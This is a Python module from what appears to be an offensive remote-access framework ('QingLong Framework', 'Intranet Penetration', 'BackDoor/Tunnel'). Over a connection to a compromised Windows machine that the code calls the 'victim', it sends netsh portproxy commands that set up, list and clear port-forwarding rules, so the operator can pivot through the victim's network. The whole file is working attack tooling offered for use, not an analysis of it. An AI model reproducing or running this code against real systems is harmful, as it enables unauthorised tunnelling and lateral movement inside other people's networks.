from prettytable import PrettyTable
import struct


# 利用Netsh进行端口转发
def Netsh(conn):
    table = PrettyTable()
    table.title = '\033[1;34;34m' + "Netsh端口转发" + '\033[0m'
    table.field_names = ['\033[1;34;34m' + "Num" + '\033[0m', '\033[1;34;34m' + "Model" + '\033[0m', '\033[1;34;34m' + "Usage" + '\033[0m']
    table.add_rows([
        ["1", "设置端口转发", "1 listen_port connect_port target_ip"],
        ["2", "查看所有的端口转发规则", "2"],
        ["3", "清除所有的端口转发规则", "3"]
    ])
    print(table)
    while True:
        try:
            choice = input('\033[1;32;32m' + "(QingLong Framework/Intranet Penetration)-" + '\033[0m' + '\033[1;31;31m' + "[BackDoor/Tunnel/2] " + '\033[0m')
            if choice.lower() == 'help':
                print(table)
                continue
            elif choice == 'exit':
                break
            elif choice == "":
                continue
            elif choice.split()[0] == '1':
                print('\033[1;32;32m' + "[+] Setting Port forwarding......" + '\033[0m')
                Set_Port_Forwarding = "netsh interface portproxy add v4tov4 listenport=" + choice.split()[1] + " connectport=" + choice.split()[2] + " connectaddress=" + choice.split()[3] + " && echo \"{}\" > 1.txt && type 1.txt && DEL 1.txt && exit".format('\033[1;34;34m' + "[+] Finished!" + '\033[0m')
                print('\033[1;32;32m' + "[+] victim's ip:{} => {}:{}.".format(choice.split()[1], choice.split()[3], choice.split()[2]) + '\033[0m')
                receive(conn, Set_Port_Forwarding)
                continue
            elif choice == '2':
                print('\033[1;32;32m' + "[+] Viewing all Port forwarding rules......" + '\033[0m')
                show_command = "netsh interface portproxy show all && echo \"{}\" > 1.txt && type 1.txt && DEL 1.txt && exit".format('\033[1;34;34m' + "[+] Finished!" + '\033[0m')
                receive(conn, show_command)
                continue
            elif choice == '3':
                print('\033[1;32;32m' + "[+] Clearing all Port forwarding rules......" + '\033[0m')
                delete_command = "netsh interface portproxy reset && echo \"{}\" > 1.txt && type 1.txt && DEL 1.txt && exit".format('\033[1;34;34m' + "[+] Finished!" + '\033[0m')
                receive(conn, delete_command)
                continue
            else:
                continue
        except:
            continue


def receive(conn, command):
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
